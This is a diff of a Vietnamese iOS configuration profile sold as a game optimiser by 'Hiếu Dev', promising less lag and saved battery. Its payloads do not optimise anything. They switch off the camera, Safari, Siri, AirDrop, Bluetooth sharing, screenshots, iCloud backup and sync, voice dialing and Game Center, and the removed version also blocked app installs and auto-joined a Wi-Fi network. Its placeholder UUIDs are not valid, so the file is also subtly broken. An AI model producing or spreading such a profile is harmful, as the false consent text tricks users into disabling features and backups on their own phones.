@@ -14,81 +14,113 @@
   <key>PayloadDisplayName</key>
   <string>Tối Ưu Game - Hiếu Dev</string>
   <key>PayloadDescription</key>
-  <string>Tối ưu hóa thiết bị để chơi game mượt hơn (Free Fire, Roblox, v.v).</string>
+  <string>Cấu hình giúp tối ưu thiết bị để chơi game mượt hơn.</string>
   <key>ConsentText</key>
   <dict>
     <key>default</key>
-    <string>Bạn đồng ý cài đặt cấu hình tối ưu thiết bị để giảm lag và tiết kiệm pin khi chơi game.</string>
+    <string>Bạn đồng ý cài đặt cấu hình tối ưu để tiết kiệm RAM, pin và giảm lag khi chơi game.</string>
   </dict>
   <key>PayloadContent</key>
   <array>
 
-    <!-- 1. Cấu hình Wi-Fi -->
+    <!-- 1. Tắt Camera -->
     <dict>
-      <key>PayloadType</key>
-      <string>com.apple.wifi.managed</string>
-      <key>PayloadVersion</key>
-      <integer>1</integer>
-      <key>PayloadIdentifier</key>
-      <string>com.hieu.wifi</string>
-      <key>PayloadUUID</key>
-      <string>2A1B2C3D-4E5F-6789-AAAA-BBBBBBBBBBBB</string>
-      <key>PayloadDisplayName</key>
-      <string>Wi-Fi Game</string>
-      <key>SSID_STR</key>
-      <string>Game_WIFI</string>
-      <key>AutoJoin</key>
-      <true/>
-      <key>EncryptionType</key>
-      <string>WPA</string>
-      <key>Password</key>
-      <string>12345678</string>
+      <key>PayloadType</key><string>com.apple.applicationaccess</string>
+      <key>PayloadVersion</key><integer>1</integer>
+      <key>PayloadIdentifier</key><string>com.hieu.restriction.camera</string>
+      <key>PayloadUUID</key><string>uuid-0001</string>
+      <key>PayloadDisplayName</key><string>Tắt Camera</string>
+      <key>allowCamera</key><false/>
     </dict>
 
-    <!-- 2. Dữ liệu không xác định (dummy) -->
+    <!-- 2. Tắt Safari -->
     <dict>
-      <key>PayloadType</key>
-      <string>com.apple.dummy.data</string>
-      <key>PayloadVersion</key>
-      <integer>1</integer>
-      <key>PayloadIdentifier</key>
-      <string>com.hieu.unknown.data</string>
-      <key>PayloadUUID</key>
-      <string>DEADBEEF-DEAD-BEEF-DEAD-BEEFDEADBEEF</string>
-      <key>PayloadDisplayName</key>
-      <string>Dữ liệu không xác định</string>
-      <key>PayloadDescription</key>
-      <string>Chứa thông tin placeholder.</string>
+      <key>PayloadType</key><string>com.apple.applicationaccess</string>
+      <key>PayloadVersion</key><integer>1</integer>
+      <key>PayloadIdentifier</key><string>com.hieu.restriction.safari</string>
+      <key>PayloadUUID</key><string>uuid-0002</string>
+      <key>PayloadDisplayName</key><string>Tắt Safari</string>
+      <key>allowSafari</key><false/>
     </dict>
 
-    <!-- 3.–10. Giới hạn (Restrictions) -->
+    <!-- 3. Tắt Siri -->
     <dict>
-      <key>PayloadType</key>
-      <string>com.apple.applicationaccess</string>
-      <key>PayloadVersion</key>
-      <integer>1</integer>
-      <key>PayloadIdentifier</key>
-      <string>com.hieu.restrictions</string>
-      <key>PayloadUUID</key>
-      <string>11223344-5566-7788-99AA-BBCCDDEEFF00</string>
-      <key>PayloadDisplayName</key>
-      <string>Giới hạn Game</string>
-      <key>allowAppInstallation</key>
-      <false/>
-      <key>allowCamera</key>
-      <false/>
-      <key>allowScreenShot</key>
-      <false/>
-      <key>allowCloudBackup</key>
-      <false/>
-      <key>allowCloudDocumentSync</key>
-      <false/>
-      <key>allowVoiceDialing</key>
-      <false/>
-      <key>allowGameCenter</key>
-      <false/>
-      <key>allowSafari</key>
-      <false/>
+      <key>PayloadType</key><string>com.apple.applicationaccess</string>
+      <key>PayloadVersion</key><integer>1</integer>
+      <key>PayloadIdentifier</key><string>com.hieu.restriction.siri</string>
+      <key>PayloadUUID</key><string>uuid-0003</string>
+      <key>PayloadDisplayName</key><string>Tắt Siri</string>
+      <key>allowSiri</key><false/>
+    </dict>
+
+    <!-- 4. Tắt Bluetooth Sharing -->
+    <dict>
+      <key>PayloadType</key><string>com.apple.applicationaccess</string>
+      <key>PayloadVersion</key><integer>1</integer>
+      <key>PayloadIdentifier</key><string>com.hieu.restriction.bluetooth</string>
+      <key>PayloadUUID</key><string>uuid-0004</string>
+      <key>PayloadDisplayName</key><string>Tắt Bluetooth Sharing</string>
+      <key>allowBluetoothSharing</key><false/>
+    </dict>
+
+    <!-- 5. Tắt AirDrop -->
+    <dict>
+      <key>PayloadType</key><string>com.apple.applicationaccess</string>
+      <key>PayloadVersion</key><integer>1</integer>
+      <key>PayloadIdentifier</key><string>com.hieu.restriction.airdrop</string>
+      <key>PayloadUUID</key><string>uuid-0005</string>
+      <key>PayloadDisplayName</key><string>Tắt AirDrop</string>
+      <key>allowAirDrop</key><false/>
+    </dict>
+
+    <!-- 6. Tắt chụp màn hình -->
+    <dict>
+      <key>PayloadType</key><string>com.apple.applicationaccess</string>
+      <key>PayloadVersion</key><integer>1</integer>
+      <key>PayloadIdentifier</key><string>com.hieu.restriction.screenshot</string>
+      <key>PayloadUUID</key><string>uuid-0006</string>
+      <key>PayloadDisplayName</key><string>Tắt Screenshot</string>
+      <key>allowScreenShot</key><false/>
+    </dict>
+
+    <!-- 7. Tắt sao lưu iCloud -->
+    <dict>
+      <key>PayloadType</key><string>com.apple.applicationaccess</string>
+      <key>PayloadVersion</key><integer>1</integer>
+      <key>PayloadIdentifier</key><string>com.hieu.restriction.icloudbackup</string>
+      <key>PayloadUUID</key><string>uuid-0007</string>
+      <key>PayloadDisplayName</key><string>Tắt iCloud Backup</string>
+      <key>allowCloudBackup</key><false/>
+    </dict>
+
+    <!-- 8. Tắt đồng bộ tài liệu iCloud -->
+    <dict>
+      <key>PayloadType</key><string>com.apple.applicationaccess</string>
+      <key>PayloadVersion</key><integer>1</integer>
+      <key>PayloadIdentifier</key><string>com.hieu.restriction.icloudsync</string>
+      <key>PayloadUUID</key><string>uuid-0008</string>
+      <key>PayloadDisplayName</key><string>Tắt iCloud Document Sync</string>
+      <key>allowCloudDocumentSync</key><false/>
+    </dict>
+
+    <!-- 9. Tắt gọi bằng giọng nói -->
+    <dict>
+      <key>PayloadType</key><string>com.apple.applicationaccess</string>
+      <key>PayloadVersion</key><integer>1</integer>
+      <key>PayloadIdentifier</key><string>com.hieu.restriction.voicedial</string>
+      <key>PayloadUUID</key><string>uuid-0009</string>
+      <key>PayloadDisplayName</key><string>Tắt Voice Dialing</string>
+      <key>allowVoiceDialing</key><false/>
+    </dict>
+
+    <!-- 10. Tắt Game Center -->
+    <dict>
+      <key>PayloadType</key><string>com.apple.applicationaccess</string>
+      <key>PayloadVersion</key><integer>1</integer>
+      <key>PayloadIdentifier</key><string>com.hieu.restriction.gamecenter</string>
+      <key>PayloadUUID</key><string>uuid-0010</string>
+      <key>PayloadDisplayName</key><string>Tắt Game Center</string>
+      <key>allowGameCenter</key><false/>
     </dict>
 
   </array>
